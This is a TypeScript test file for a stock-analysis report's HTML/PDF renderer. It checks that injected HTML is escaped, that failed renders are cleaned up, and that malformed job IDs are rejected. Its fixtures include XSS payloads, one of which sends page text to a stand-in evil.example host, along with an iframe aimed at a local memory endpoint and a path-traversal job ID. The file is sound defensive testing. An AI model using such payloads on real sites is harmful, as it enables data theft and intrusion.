import assert from "node:assert/strict";
import {
  existsSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import { renderReportHtml, saveReportWithRenderer } from "./pdf-report.js";

async function inTemporaryWorkingDirectory(
  run: (directory: string) => Promise<void>,
): Promise<void> {
  const directory = mkdtempSync(join(tmpdir(), "stockanalyst-pdf-report-"));
  const previousDirectory = process.cwd();
  process.chdir(directory);
  try {
    await run(process.cwd());
  } finally {
    process.chdir(previousDirectory);
    rmSync(directory, { recursive: true, force: true });
  }
}

test("renders seller HTML payloads as inert text", () => {
  const payloads = [
    "<script>fetch('https://evil.example/' + document.body.innerText)</script>",
    '<img src="https://evil.example/pixel" onerror="alert(1)">',
    '<iframe src="http://127.0.0.1:9374/v1/memory"></iframe>',
    '</div><style>body{display:none}</style><div>',
    '<a href="https://evil.example">click</a>',
  ];

  for (const payload of payloads) {
    const html = renderReportHtml(payload, {
      jobId: "7",
      date: "23 July 2026",
      symbols: "AAPL",
    });
    assert.ok(html.includes("&lt;"));
    assert.doesNotMatch(html, /<(script|img|iframe|a)\b/i);
    assert.doesNotMatch(html, /\bon(?:error|load)\s*=\s*["']/i);
    assert.doesNotMatch(html, /<\/div><style>body\{display:none\}/i);
  }
});

test("escapes every metadata field", () => {
  const html = renderReportHtml("safe", {
    jobId: '7</div><script>alert(1)</script>',
    date: '<img src=x onerror="alert(1)">',
    symbols: 'AAPL</div><iframe src="https://evil.example">',
  });
  assert.doesNotMatch(html, /<(script|img|iframe)\b/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /&lt;img/);
  assert.match(html, /&lt;iframe/);
});

test("contains no browser-side script while preserving report styling", () => {
  const html = renderReportHtml(
    "# Verdict\n\n> **BUY**\n\nReturn: +12.5% and drawdown: -3.2%\n\n| Symbol | View |\n| --- | --- |\n| AAPL | HOLD |",
    { jobId: "7", date: "23 July 2026", symbols: "AAPL" },
  );
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /\.innerHTML\s*=/);
  assert.match(html, /<h1>Verdict<\/h1>/);
  assert.match(html, /badge-buy/);
  assert.match(html, /badge-hold/);
  assert.match(html, /class="pos"/);
  assert.match(html, /class="neg"/);
  assert.match(html, /<table>/);
});

test("removes a partial PDF while keeping an inert HTML fallback when rendering fails", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    const result = await saveReportWithRenderer(
      "<script>alert('unsafe')</script>",
      "42",
      ["AAPL"],
      async (_html, pdfPath) => {
        writeFileSync(pdfPath, "partial pdf", "utf8");
        throw new Error("sandbox unavailable");
      },
    );

    assert.equal(result.pdfPath, null);
    assert.equal(result.htmlPath, resolve(directory, "stock-analysis-42.html"));
    assert.equal(existsSync(resolve(directory, "stock-analysis-42.pdf")), false);
    const html = readFileSync(result.htmlPath, "utf8");
    assert.match(html, /&lt;script&gt;/);
    assert.doesNotMatch(html, /<script\b/i);
  });
});

test("rejects noncanonical job IDs before writing files or calling the renderer", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    const outsidePath = resolve(directory, "..", "pdf-report-escape.html");
    const invalidJobIds = [
      "01",
      "",
      "+1",
      "-1",
      " 1",
      "1 ",
      "1.0",
      "1_000",
      "0x1",
      "..//..//../pdf-report-escape",
      "115792089237316195423570985008687907853269984665640564039457584007913129639936",
    ];
    let rendererCalls = 0;

    for (const jobId of invalidJobIds) {
      await assert.rejects(
        saveReportWithRenderer("safe", jobId, ["AAPL"], async () => { rendererCalls += 1; }),
        /canonical decimal uint256/,
      );
    }

    assert.equal(rendererCalls, 0);
    assert.equal(existsSync(outsidePath), false);
    assert.deepEqual(readdirSync(directory), []);
  });
});

test("passes the saved inert HTML to a successful PDF renderer", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    let renderedHtml: string | undefined;
    const expectedPdfPath = resolve(directory, "stock-analysis-43.pdf");

    const result = await saveReportWithRenderer(
      "# **BUY** AAPL",
      "43",
      ["AAPL"],
      async (html, pdfPath) => {
        renderedHtml = html;
        assert.equal(pdfPath, expectedPdfPath);
        writeFileSync(pdfPath, "pdf", "utf8");
      },
    );

    assert.equal(result.pdfPath, expectedPdfPath);
    assert.equal(result.htmlPath, resolve(directory, "stock-analysis-43.html"));
    assert.equal(renderedHtml, readFileSync(result.htmlPath, "utf8"));
    assert.match(renderedHtml ?? "", /badge-buy/);
  });
});
